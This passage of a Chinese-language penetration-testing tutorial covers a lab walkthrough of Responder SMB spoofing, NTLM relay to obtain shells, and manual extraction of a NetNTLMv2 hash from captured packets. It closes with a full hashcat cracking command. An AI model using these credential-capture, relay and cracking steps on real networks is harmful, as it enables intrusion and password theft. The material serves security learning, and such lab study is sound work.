# 0x02 常规工具流程使用
在很多教程中都使用了Responder这个工具来进行演示，因为Responder是一款较为成熟的linux平台SMB欺骗中继工具。它可以运行在py2或者py3上面，且无需安装其他额外的库。
py2的版本需要使用py2.7.15+，不然会出现如下错误
    AttributeError: 'module' object has no attribute 'check_output'
在这里笔者会使用GitHub上，原生未修改过的Responder V3.0.2.0 + py3.7.3 +kali来进行演示。
工具下载链接：
    https://github.com/lgandx/Responder/releases/tag/v3.0.2.0
在文章中使用 **中间人** 代表进行监听欺骗的Kali
## 1.SMB欺骗获取凭证
**测试环境：**
**工作组：**
**中间人** ：192.168.20.131 kali
**打工人A机器** ：192.168.20.1 2008
首先在中间人上面打开Responder进行监听
    python3 Responder.py -I eth0
在打工人A机器CMD框内输入不能被解析的路径asdasdasd
    net use \\asdasdasd
可以看到在输入命令之后，我们的Kali监听到了来自2008机器administrator的NTLM v2
凭证。这个v2凭证不能用来PTH，但是可以通过这个配合字典来破解出administrator的明文密码。此凭证放在logs文件夹中和Responder.db中。
可以通过hashcat 来进行破解
**域机器：**
**中间人** ：192.168.20.131 kali
**域用户bjtest机器** ：192.168.20.3 2008
在这里其实表现形式和工作组的大差不大，就是用户名和登录域变成了所在域内信息！
同样的在中间人上面打开Responder进行监听
在域用户bjtest机器上执行如下命令
    net use \\asdasdasd
这时候在中间人机器上已经成功抓取到了来自192.168.20.3 BJtest用户的v2凭证，并且会把凭证放在logs文件夹中和Responder.db中。
同样的拿着这些数据去进行破解！
在这里不论是工作组的凭证获取还是域用户的凭证获取，只要当Responder重复获取到同一个用户时不会再显示。我们可以去对应文件中查看！
这里是最简单的步骤，仅仅获取一个NTLM
v2数据。因为我之前提到的2008及以上版本使用的是v2认证，所以这里没有演示v1。v1和v2一样都可以破解，只是v1多了一个还原NTLM
Hash的效果。这里放在下面的议题中去描述！
## 2.NTLM中继攻击
NTLM中继攻击就相当于我们的中间人做一个中转，就可以拿到被欺骗机器传过来的Hash结合被攻击对象Challenge，从而尝试拿下被攻击的目标。但是这里和PTH很相似，对于工作组而言，需要sid为500用户的hash。也就是被欺骗主机是sid
500的用户发起的请求，且密码与被攻击主机sid500 账户密码相同。对于域用户而言，需要域管理员组的用户发起请求才行。
图片取自 侵删
在这里需要注意的是，被攻击机器不能开启SMB签名。默认不是开启的，但是在域中域控是默认开启的。所以在域中通常就是中继管理组成员到一些敏感的机器上。在某些帖子中说开放共享权限的账号，能够实现中继。这是错误的，经过实验只能管理用户！
### (1)中继前信息搜集
当我们想尝试NTLM中继时，第一时间要做的是检查对方是否有开始SMB签名！默认不开启，但是域控默认开启！在这里可以用Responder配套的RunFinger.py脚本来进行扫描(NMAP也可以)，RunFinger.py在Responder中的tools文件夹中就有。
### (2)M中继过程
这里使用Responder配套脚本tools目录下的MultiRelay.py脚本测试中继效果！
**工作组：**
**中间人** ：192.168.60.131 kali
**打工人A机器** ：192.168.60.141 win7
**管理层B机器** ：192.168.60.5 2008
因为工作组的登陆凭证都是存放在机器本地的，所以在这里将A机器和B机器的sid 500 账户 administrator密码都改为QWE123!@#
。且创建一个普通Ktester账户 密码都为QWE123!@#
。在这里对比不同权限账户密码相同时是否可以中继！在这里使用访问共享的形式来检测SMB第一次带过去的账号密码是否能正常登录共享目录，再去检测是否能中继！中继和共享登录是两回事！
**administrator账户**
在管理层B机器上面设置共享文档administrator，设置共享后默认用户为administrator
首先A机器去访问B机器的共享，发现是不需要密码的。但是这里有一点AB机器改完密码后需要重启一下更新下内存中的密码Hash。
这时候再去中继测试，在这里要设置Responder.conf中红框参数为OFF。
使用A机器访问一个不存在目标asdasdasd，这个时候发现拿到中继的SHELL了！
**普通Ktester账户**
当前机器未加入域中
全部重新启动登录Dtester账户，在B上以Dtester账户创建共享目录Dtester。且共享人为本地普通账户Dtester！在这里低权限共享需要本地管理员权限开启共享！
在这里开始使用A机器(当前用户Dtester)去访问此共享，工具理论这里实验成功。
接下来就是测试低权限共享账号是否能中继拿shell
经过测试发现低权限的可访问对应共享的账号并不能中继成功，失败的意思大致就是账户权限低被拒绝。可见能够访问共享但是不一定能中继拿SHELL！
那么在工作组中到底什么权限肯定能够中继拿shell成功呢？在这里已经确定administrator是可以的，那么administrator组的用户呢？
在AB上分别创建TT账户，密码为QWE123!@#。A上TT账户是普通权限，B上TT是管理组权限。在这里测试是否能够中继成功！
AB加上普通账户后开启共享，测试完能够直接访问共享。
将B中的TT加入管理员组
在这里进行中继测试，发现并不行
那么在这里将A中的TT加入管理员组呢？
发现这样中继也还是不行！
命令提示还是权限不够
**工作组中继总结** ：
我们只能够中继sid 500
administrator账户，成功的条件是被欺骗机器的administrator密码和被攻击主机的administrator密码相同！
**域：**
**中间人** ：192.168.60.131 kali
**打工人A机器** ：192.168.60.141 win7
**管理层B机器** ：192.168.60.5 2008
**域普通Htester账户**
在这里首先将AB两台机器都加入Hacke.testlab域环境！且创建两个域内普通权限账号 HONE HTWO！
环境弄好之后，首先在B上面以HTWO用户创建一个共享文件夹！
在域中和工作组中是不一样的，域内的NTLM认证数据会从域控那里获取。且这里访问共享也是从域数据库找的，域内普通用户互相访问是不需要密码认证的！
那么这样是否就代表域普通用户可以中继到域普通账户登录的机器呢？经过测试也不行的！
这里错误的还是账户权限较低!
那么这里将我们A机器的HONE账户加入Domain Admins 组去试试
在这里开启监听，发现这样是可以的！
**域管理账户：**
中继到域控NET-NTLM HASH的情况就不用说了，除了开了SMB签名的。看谁谁怀孕，效果和PTH一样！
**域中继总结** ：
当我们中继域控或者域管理员组的成员的NET-NTLM Hash 时是可以进行中继攻击的，这里和工作组不一样！
## (3).使用ntlmrelayx.py结合empire统一化管理
empire类似msf后渗透神器，这样你们就懂了。就是empire生成木马，然后由ntlmrelayx.py中继拿shell后执行e的木马然后上线。这里不写，因为它需要安装依赖。  
参考链接：  
## (4).smbrelayx
在这里还可以使用 smbrelayx.py ，但是需要安装依赖。因此不实验！
参考链接：  
常规流程总结：
就是碰运气，碰到权限高的就直接拿下低权限机器。但是这里需要你知道我上述所说的那些中继总结，哪些权限的账号能够中继低权限账号。一开始在信息搜集完后，如果没有任何进展。可以冒险的尝试欺骗域控机器，中继拿下一些关键服务器什么的。实在不行了再全部监听，下下之策。
# 0x03 手工获取NET NTML Hash与破解
在这里带大家手工实验获取组合一遍NET NTLM Hash，这样可以帮助你更好的理解！
V2
实验环境：
域主机（win7）192.168.60.3
域控 192.168.60.1
pass:当域控多次恢复快照之后会出现问题，导致无法加进新的机器。且wireshark3.0版本安装出现复杂问题，直接win7加入域后，通过域账号登陆安装2.x版本即可。
红框中的四条数据就是NTML认证的四个步骤
在第二个数据包中，里面存放是域控发给我们的challenge
    NTLM Server Challenge: c1eac186d6edb142
查看第三个数据包，获得Response（里面包含NTMLv2）
    7b:6d:10:47:eb:a9:92:f3:d6:25:b8:d1:b0:de:d7:8e:01:01:00:00:00:00:00:00:22:e9:2d:e1:7b:b6:d6:01:98:04:8b:66:53:d5:92:6e:00:00:00:00:02:00:0a:00:48:00:41:00:43:00:4b:00:45:00:01:00:1e:00:57:00:49:00:4e:00:2d:00:51:00:32:00:4a:00:52:00:34:00:4d:00:55:00:52:00:47:00:53:00:30:00:04:00:1a:00:68:00:61:00:63:00:6b:00:65:00:2e:00:74:00:65:00:73:00:74:00:6c:00:61:00:62:00:03:00:3a:00:57:00:49:00:4e:00:2d:00:51:00:32:00:4a:00:52:00:34:00:4d:00:55:00:52:00:47:00:53:00:30:00:2e:00:68:00:61:00:63:00:6b:00:65:00:2e:00:74:00:65:00:73:00:74:00:6c:00:61:00:62:00:05:00:1a:00:68:00:61:00:63:00:6b:00:65:00:2e:00:74:00:65:00:73:00:74:00:6c:00:61:00:62:00:07:00:08:00:22:e9:2d:e1:7b:b6:d6:01:06:00:04:00:02:00:00:00:08:00:30:00:30:00:00:00:00:00:00:00:00:00:00:00:00:20:00:00:9e:1a:4c:16:24:4c:80:f3:c2:97:fc:21:0c:10:30:2a:a0:a7:4e:ab:23:7b:80:64:50:d2:4e:fb:53:86:ce:a3:0a:00:10:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:09:00:22:00:63:00:69:00:66:00:73:00:2f:00:31:00:39:00:32:00:2e:00:31:00:36:00:38:00:2e:00:36:00:30:00:2e:00:31:00:00:00:00:00:00:00:00:00:00:00:00:00
破解NTMLv2需要的格式为：
    username::domain:challenge:HMAC-MD5:blob
username 为第三个数据包最后面的用户名
    admin
domain 是用户名前面的
    HACKE
challenge为第二个包中NTML Server Challenge
    c1eac186d6edb142
HMAC-MD5对应第三个数据包中的NTProofStr
    NTProofStr: 7b6d1047eba992f3d625b8d1b0ded78e
blob对应第三个数据包中Response去掉NTProofStr的后半部分
    010100000000000022e92de17bb6d60198048b6653d5926e0000000002000a004800410043004b00450001001e00570049004e002d00510032004a00520034004d005500520047005300300004001a006800610063006b0065002e0074006500730074006c006100620003003a00570049004e002d00510032004a00520034004d00550052004700530030002e006800610063006b0065002e0074006500730074006c006100620005001a006800610063006b0065002e0074006500730074006c00610062000700080022e92de17bb6d601060004000200000008003000300000000000000000000000002000009e1a4c16244c80f3c297fc210c10302aa0a74eab237b806450d24efb5386cea30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360030002e003100000000000000000000000000
因此，完整的NTMLv2数据如下：
    admin::HACKE:c1eac186d6edb142:7b6d1047eba992f3d625b8d1b0ded78e:010100000000000022e92de17bb6d60198048b6653d5926e0000000002000a004800410043004b00450001001e00570049004e002d00510032004a00520034004d005500520047005300300004001a006800610063006b0065002e0074006500730074006c006100620003003a00570049004e002d00510032004a00520034004d00550052004700530030002e006800610063006b0065002e0074006500730074006c006100620005001a006800610063006b0065002e0074006500730074006c00610062000700080022e92de17bb6d601060004000200000008003000300000000000000000000000002000009e1a4c16244c80f3c297fc210c10302aa0a74eab237b806450d24efb5386cea30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360030002e003100000000000000000000000000
Hashcat参数如下：
    hashcat -m 5600 admin::HACKE:c1eac186d6edb142:7b6d1047eba992f3d625b8d1b0ded78e:010100000000000022e92de17bb6d60198048b6653d5926e0000000002000a004800410043004b00450001001e00570049004e002d00510032004a00520034004d005500520047005300300004001a006800610063006b0065002e0074006500730074006c006100620003003a00570049004e002d00510032004a00520034004d00550052004700530030002e006800610063006b0065002e0074006500730074006c006100620005001a006800610063006b0065002e0074006500730074006c00610062000700080022e92de17bb6d601060004000200000008003000300000000000000000000000002000009e1a4c16244c80f3c297fc210c10302aa0a74eab237b806450d24efb5386cea30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360030002e003100000000000000000000000000 /tmp/password.list -o found.txt --force
说明：  